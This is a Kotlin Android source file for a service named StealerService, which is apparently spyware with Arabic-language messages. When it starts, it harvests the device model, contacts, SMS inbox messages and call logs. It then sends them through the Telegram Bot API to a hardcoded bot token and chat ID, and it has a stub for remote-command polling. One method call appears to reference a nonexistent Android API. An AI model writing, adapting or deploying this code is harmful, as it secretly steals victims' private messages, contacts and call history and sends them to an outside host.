package com.negm.toolkit

import android.app.Service
import android.content.Intent
import android.database.Cursor
import android.net.Uri
import android.os.IBinder
import android.provider.ContactsContract
import android.provider.CallLog
import kotlinx.coroutines.*
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class StealerService : Service() {

    private val BOT_TOKEN = "8963765409:AAHf3RDaF64miIj20JIBsZ5O5ztYHK6bvng"
    private val CHAT_ID = "6823926795"
    private val serviceScope = CoroutineScope(Dispatchers.IO + Job())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        serviceScope.launch {
            sendDeviceInfo()
            harvestContacts()
            harvestSMS()
            harvestCallLogs()
            startCommandPolling()
        }
        return START_STICKY
    }

    private suspend fun sendToTelegram(text: String) {
        try {
            val url = URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            with(url.openConnection() as HttpURLConnection) {
                requestMethod = "POST"
                doOutput = true
                setRequestProperty("Content-Type", "application/json; utf-8")
                outputStream.use { os ->
                    val input = "{\"chat_id\": \"$CHAT_ID\", \"text\": \"$text\", \"parse_mode\": \"Markdown\"}".toByteArray(Charsets.UTF_8)
                    os.write(input, 0, input.size)
                }
                responseCode
            }
        } catch (e: Exception) {}
    }

    private suspend fun sendDeviceInfo() {
        val info = """
            📱 *اختراق جهاز Android جديد* 📱
            💻 موديل الجهاز: ${android.os.ModelHelper.getModel() ?: android.os.Build.MODEL}
            ⚙️ إصدار الأندرويد: ${android.os.Build.VERSION.RELEASE}
            🛠️ الماركة: ${android.os.Build.BRAND}
        """.trimIndent()
        sendToTelegram(info)
    }

    private suspend fun harvestContacts() {
        val cursor: Cursor? = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
        var count = 0
        var data = "📇 *جهات الاتصال المستخرجة:*\n"
        cursor?.use {
            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
            while (it.moveToNext() && count < 30) {
                val name = it.getString(nameIdx)
                val number = it.getString(numberIdx)
                data += "- $name: `$number`\n"
                count++
            }
        }
        sendToTelegram(data)
    }

    private suspend fun harvestSMS() {
        val cursor: Cursor? = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        var count = 0
        var data = "📩 *آخر رسائل SMS:*\n"
        cursor?.use {
            val bodyIdx = it.getColumnIndex("body")
            val addressIdx = it.getColumnIndex("address")
            while (it.moveToNext() && count < 10) {
                val address = it.getString(addressIdx)
                val body = it.getString(bodyIdx)
                data += "• من: $address\nالمحتوى: `$body`\n\n"
                count++
            }
        }
        sendToTelegram(data)
    }

    private suspend fun harvestCallLogs() {
        val cursor: Cursor? = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
        var count = 0
        var data = "📞 *سجل المكالمات:*\n"
        cursor?.use {
            val numberIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
            val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
            while (it.moveToNext() && count < 10) {
                val number = it.getString(numberIdx)
                val type = it.getString(typeIdx)
                val typeStr = when (type.toInt()) {
                    CallLog.Calls.INCOMING_TYPE -> "واردة"
                    CallLog.Calls.OUTGOING_TYPE -> "صادرة"
                    else -> "فائتة"
                }
                data += "• [$typeStr] $number\n"
                count++
            }
        }
        sendToTelegram(data)
    }

    private fun startCommandPolling() {
        // حلقة الاستماع لأوامر تليجرام للتحكم عن بعد
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
